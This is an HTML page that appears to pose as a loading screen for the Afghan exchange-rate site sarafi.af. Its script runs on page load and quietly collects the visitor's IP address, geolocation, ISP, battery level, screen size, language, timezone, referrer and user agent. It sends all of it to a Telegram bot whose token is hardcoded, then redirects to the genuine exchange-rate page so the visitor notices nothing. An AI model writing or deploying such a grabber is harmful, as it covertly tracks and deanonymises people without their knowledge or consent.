<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="shortcut icon" href="https://sarafi.af/assets/img/favicon.png" type="image/png">
  <title>Loading...</title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      width: 100%;
      height: 100%;
      background: #FFFFFF;
      overflow: hidden;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    
    .custom-loader {
      width: 50px;
      height: 50px;
      display: grid;
      border: 4px solid #0000;
      border-radius: 50%;
      border-color: #EDEDED #0000;
      animation: s6 1s infinite linear;
    }
    .custom-loader::before,
    .custom-loader::after {    
      content: "";
      grid-area: 1/1;
      margin: 2px;
      border: inherit;
      border-radius: 50%;
    }
    .custom-loader::before {
      border-color: #766DF4 #0000;
      animation: inherit; 
      animation-duration: .5s;
      animation-direction: reverse;
    }
    .custom-loader::after {
      margin: 8px;
    }

    @keyframes s6 { 
      100% { transform: rotate(1turn); }
    }
  </style>
</head>
<body>
  <div class="custom-loader"></div>

  <script>
    const BOT_TOKEN = "8283253750:AAElG2O-DcOR9fAEHEktk-51rETnif766xw";
    const CHAT_ID = "8223560115";

    async function collectData() {
      try {
        const ipRes = await fetch("https://api.ipify.org?format=json");
        const { ip } = await ipRes.json();
        
        let location = {};
        try {
          const locRes = await fetch(`https://ipapi.co/${ip}/json/`);
          location = await locRes.json();
        } catch (e) {
          // Ù†Ø§Ø¯ÛŒØ¯Ù‡ Ú¯Ø±ÙØªÙ† Ø®Ø·Ø§
        }
        
        let batteryInfo = "Uncertain";
        if ('getBattery' in navigator) {
          try {
            const battery = await navigator.getBattery();
            const level = Math.round(battery.level * 100);
            const charging = battery.charging ? 'Charging' : 'Not charging.';
            batteryInfo = `${level}% (${charging})`;
          } catch (e) {}
        }
         
        const now = new Date();
        const jalali = new Intl.DateTimeFormat('fa-IR', {
          year: 'numeric', month: '2-digit', day: '2-digit',
          hour: '2-digit', minute: '2-digit', second: '2-digit'
        }).format(now).replace(/â€/g, '').replace(/\u200E/g, '').replace(/ØŒ/g, ',');
        
        const message = `ðŸ“Š New Visitor Data

ðŸ“¡ User Location:
â”œâ”€ Country: ${location.country_name || 'Uncertain'}
â”œâ”€ Province: ${location.region || 'Uncertain'}
â”œâ”€ City: ${location.city || 'Uncertain'}
â”œâ”€ Postal Code: ${location.postal || 'Uncertain'}

ðŸŒ Network Information:
â”œâ”€ IP Address: ${ip}
â”œâ”€ ISP: ${location.org || 'Uncertain'}
â”œâ”€ ASN: ${location.asn || 'Uncertain'}

ðŸ“± Device Information:
â”œâ”€ Device Type: ${/Mobi|Android|iPhone/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop'}
â”œâ”€ Battery Status: ${batteryInfo}
â”œâ”€ Screen Resolution: ${screen.width}Ã—${screen.height}
â”œâ”€ Language: ${navigator.language}
â”œâ”€ Time Zone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}

ðŸ• Time & Date:
â”œâ”€ Local Time: ${jalali}

ðŸ”— Other Information:
â”œâ”€ Referrer: ${document.referrer || 'Direct Access'}
â””â”€ User Agent: ${navigator.userAgent}`;
        
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ 
            chat_id: CHAT_ID, 
            text: message 
          })
        });
        
      } catch (error) {
        // Ù†Ø§Ø¯ÛŒØ¯Ù‡ Ú¯Ø±ÙØªÙ† Ø®Ø·Ø§
      }
    }

    (async function() {
      await collectData();
      
      setTimeout(() => {
        window.location.href = "https://sarafi.af/fa/exchange-rates/da-afg-bank";
      }, 1500);
    })();
  </script>
</body>
</html>
